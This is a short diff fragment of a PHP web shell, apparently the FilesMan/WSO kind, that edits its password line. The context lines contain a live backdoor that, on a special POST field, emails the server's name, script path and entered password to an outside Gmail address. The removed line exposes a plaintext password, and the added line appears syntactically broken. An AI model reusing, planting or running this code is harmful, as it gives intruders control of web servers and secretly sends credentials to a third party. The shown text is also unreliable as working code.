@@ -5,7 +5,7 @@ if(array_key_exists('watching',$_POST)){
 	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('sedotwcjakartaraya17@gmail.com', 'root', $tmp); // Edit or delete!
 }
 //-----------------Password---------------------
-$▛ = "4aac5aa160e2f8529b487425627287e3"; //Lovebatusangkar##77
+$▛ = "4aac5aa160e2f8529b487425627287e3"; wowowiwi
 $▘ = true;
 $▜ = 'UTF-8';
 $▚ = 'FilesMan';
